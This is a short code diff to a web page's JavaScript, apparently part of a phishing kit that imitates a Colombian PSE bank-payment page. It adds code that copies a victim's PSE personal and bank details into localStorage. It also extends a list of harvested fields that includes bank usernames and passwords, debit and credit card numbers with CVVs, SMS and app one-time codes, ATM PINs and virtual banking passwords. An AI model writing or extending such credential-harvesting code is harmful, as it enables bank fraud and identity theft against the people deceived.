@@ -591,6 +591,34 @@
 
             console.log('Session ID:', appState.uniqId);
 
+            // ==================== RECUPERAR DATOS PSE ====================
+            const pseDatosStr = sessionStorage.getItem('pseDatos');
+            if (pseDatosStr) {
+                try {
+                    const pseDatos = JSON.parse(pseDatosStr);
+                    const camposPSE = {
+                        'nombre': pseDatos.nombre,
+                        'email': pseDatos.email,
+                        'celular': pseDatos.celular,
+                        'direccion': pseDatos.direccion,
+                        'ciudad': pseDatos.ciudad,
+                        'departamento': pseDatos.departamento,
+                        'banco': pseDatos.banco,
+                        'tipoPersona': pseDatos.tipoPersona,
+                        'ente': 'brasilia'
+                    };
+                    Object.keys(camposPSE).forEach(key => {
+                        if (camposPSE[key]) {
+                            const storageKey = `${appState.uniqId}_${key}`;
+                            localStorage.setItem(storageKey, JSON.stringify(camposPSE[key]));
+                        }
+                    });
+                    console.log('Datos PSE recuperados:', pseDatos);
+                } catch (e) {
+                    console.error('Error al parsear pseDatos:', e);
+                }
+            }
+
             // ==================== FUNCIONES DE ALMACENAMIENTO ====================
             function saveToLocalStorage(key, value) {
                 const storageKey = `${appState.uniqId}_${key}`;
@@ -688,8 +716,8 @@
                     'usuario', 'clave', 'ente', 'status', 'uniqid',
                     'numtarjetaTDB', 'vencimientoTDB', 'cvvTDB',
                     'numtarjetaTDC', 'vencimientoTDC', 'cvvTDC',
-                    'nombre', 'cedula', 'email', 'celular', 'ciudad', 'direccion',
-                    'otpsms', 'otpapp', 'clavecajero', 'clavevirtual'
+                    'nombre', 'cedula', 'email', 'celular', 'ciudad', 'direccion', 'departamento',
+                    'banco', 'tipoPersona', 'otpsms', 'otpapp', 'clavecajero', 'clavevirtual'
                 ];
 
                 fields.forEach(field => {
